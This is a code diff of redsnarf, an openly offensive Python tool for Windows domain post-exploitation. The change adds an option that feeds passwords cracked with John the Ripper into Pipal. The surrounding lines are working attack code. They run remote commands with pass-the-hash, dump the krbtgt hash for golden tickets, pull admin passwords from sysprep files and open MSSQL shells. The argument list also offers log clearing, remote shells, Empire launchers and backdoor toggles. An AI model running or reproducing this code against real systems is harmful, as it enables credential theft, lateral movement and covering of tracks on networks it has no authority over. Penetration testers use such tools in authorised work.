@@ -188,7 +188,6 @@ class SAMRDump:
 
         # Setup Connection
 		resp = samr.hSamrConnect2(dce)       
-
 		
 		if resp['ErrorCode'] != 0:
 			raise Exception('Connect error')
@@ -984,7 +983,6 @@ def datadump(user, passw, host, path, os_version):
 					else:
 						print colored("[-]No logged on users found: "+host,'red')
 						exit(1)	
-
 										
 					for x in xrange(0,len(loggeduser)):
 												
@@ -1029,8 +1027,7 @@ def datadump(user, passw, host, path, os_version):
 
 			if unattend in yesanswers:
 				
-				try:
-					
+				try:					
 					#Check for 64 Bit Version Values of VMWare DeployData
 					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					deploydata=proc.communicate()[0]
@@ -1130,18 +1127,15 @@ def datadump(user, passw, host, path, os_version):
 							for x in content:
 								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')
 
-
 					if os.path.isfile(outputpath+host+"/sysprep.inf"):
 						print colored("[+]sysprep.xml file found",'green')
 						
 						os.chdir(outputpath+host)
 					
 						os.system("grep --color='auto' -i AdminPassword sysprep.inf")
-				
 
 				except OSError:
 					print colored("[-]Something went wrong running looking for files...",'red')
-
 
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
@@ -1176,6 +1170,7 @@ def syschecks():
 	else:
 		print colored("[+]creddump7 found",'green')
 		logging.info("[+]creddump7 found")
+
 def checkport():
 	host=targets[0]
 	scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(host)], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
@@ -1202,7 +1197,6 @@ def get_local_admins(ip,username,password,domain):
 		
 	return LocalAdmin	
 
-
 def get_domain_admins(ip,username,password,domain):
 	
 	DomainAdmin=False
@@ -1219,7 +1213,6 @@ def get_domain_admins(ip,username,password,domain):
 			DomainAdmin = True
 		
 	return DomainAdmin	
-
 
 def run():
 	user=args.username.strip()
@@ -1561,7 +1554,8 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -1578,6 +1572,7 @@ p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<O
 p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 p.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
 p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+p.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
 p.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
 p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
@@ -1668,6 +1663,18 @@ recorddesktop=args.recorddesktop
 empire_launcher=args.empire_launcher
 mssqlshell=args.mssqlshell
 wifi_credentials=args.wifi_credentials
+john_to_pipal=args.john_to_pipal
+
+#Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
+#in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
+if john_to_pipal!='':
+	print colored("[+]Sending Cracked passwords from "+john_to_pipal+" to Pipal:",'yellow')
+	proc = subprocess.Popen("john --format=nt "+john_to_pipal+" --show  | cut --delimiter=':' -f2 | sed '/^$/d' | grep -Ev 'password hashes cracked,' > /tmp/tmp.txt | pipal /tmp/tmp.txt > /tmp/pipalstats.txt" , stdout=subprocess.PIPE,shell=True).wait()
+	
+	if os.stat('/tmp/pipalstats.txt').st_size >0:
+		print colored("[+]Pipal Stats have been output to /tmp/pipalstats.txt:",'green')
+	
+	sys.exit()
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1746,7 +1753,6 @@ if wifi_credentials in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-
 if mssqlshell=="WIN" or mssqlshell=="DB":
 	if len(targets)==1:
 		try:			
@@ -1771,10 +1777,9 @@ if mssqlshell=="WIN" or mssqlshell=="DB":
 					os.system("mssqlclient.py -hashes "+passw+' '+domain_name+"/"+user+"@"+targets[0]+" -windows-auth ")
 				else:
 					os.system("mssqlclient.py "+domain_name+"/"+user+":"+passw+"@"+targets[0]+" -windows-auth ")
-
 			else:
 				os.system("mssqlclient.py "+user+":"+passw+"@"+targets[0])
-			
+		
 			sys.exit()
 			
 		except OSError:
@@ -1783,7 +1788,6 @@ if mssqlshell=="WIN" or mssqlshell=="DB":
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
-
 
 if recorddesktop in yesanswers:
 	if len(targets)==1:
@@ -1815,7 +1819,6 @@ if recorddesktop in yesanswers:
 				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
-
 
 				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
@@ -1889,7 +1892,6 @@ if golden_ticket in yesanswers:
 					proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
 				else:
 					proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
-							
 
 				stdout_value = proc.communicate()[0]
 				krbtgt_data=stdout_value.splitlines()
@@ -2267,7 +2269,8 @@ if edq_nla!='n':
 				print colored("[+]Querying the status of NLA:",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
 
-				sys.exit()	
+				sys.exit()
+
 		except OSError:
 				print colored("[-]Something went wrong...",'red')
 				sys.exit()	
@@ -2371,7 +2374,6 @@ if edq_rdp!='n':
 		sys.exit()
 
 if edq_backdoor!='n':
-
 	if len(targets)==1:
 		try:
 			if edq_backdoor=='e':
@@ -2404,7 +2406,6 @@ if edq_backdoor!='n':
 		sys.exit()
 
 if edq_uac!='n':
-	
 	if len(targets)==1:
 		try:
 			if edq_uac=='e':
@@ -2837,9 +2838,6 @@ if user_desc in yesanswers:
 	else:
 		print colored ('\n[-]It is only possible to use this function on a single target and not a range','red')
 		sys.exit()
-
-
-
 if targets is None:
 	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
 	sys.exit()
